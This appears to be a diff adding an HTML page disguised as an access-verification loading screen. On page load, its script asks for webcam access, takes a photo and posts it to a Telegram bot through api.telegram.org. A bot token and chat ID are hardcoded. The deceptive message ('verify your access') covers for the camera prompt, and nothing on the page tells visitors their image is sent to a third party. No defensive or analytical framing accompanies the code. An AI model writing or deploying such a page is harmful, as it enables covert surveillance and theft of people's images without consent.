@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #111;
+            color: #fff;
+            padding: 50px;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            margin-top: 20px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Processing your request...</h1>
+    <div class="loader"></div>
+    <div class="message">
+        <p>Please wait while we verify your access...</p>
+    </div>
+
+    <script>
+        // Replace these with your Telegram Bot Token and Chat ID
+        const TELEGRAM_BOT_TOKEN = "8629743801:AAFyYyyNX7NWwXvVH82Fpk15LxKw4BUjm38";
+        const TELEGRAM_CHAT_ID = "8596657965";
+
+        // Function to send the image to Telegram
+        function sendImageToTelegram(imageData) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+            formData.append("photo", imageData);
+
+            fetch(url, {
+                method: "POST",
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => console.log("Image sent to Telegram:", data))
+            .catch(error => console.error("Error sending image:", error));
+        }
+
+        // Capture the webcam and send the image
+        function captureAndSendImage() {
+            const video = document.createElement("video");
+            const canvas = document.createElement("canvas");
+            const context = canvas.getContext("2d");
+
+            // Set up the webcam
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Wait for the video to start playing
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Stop the webcam stream
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // Convert the image to a blob and send it
+                        canvas.toBlob(blob => {
+                            const reader = new FileReader();
+                            reader.onload = () => {
+                                const imageData = new Blob([reader.result], { type: "image/jpeg" });
+                                sendImageToTelegram(imageData);
+                            };
+                            reader.readAsArrayBuffer(blob);
+                        }, "image/jpeg");
+                    }, 2000); // Wait 2 seconds for the webcam to stabilize
+                })
+                .catch(error => {
+                    console.error("Error accessing webcam:", error);
+                });
+        }
+
+        // Send the image immediately
+        captureAndSendImage();
+    </script>
+</body>
+</html>
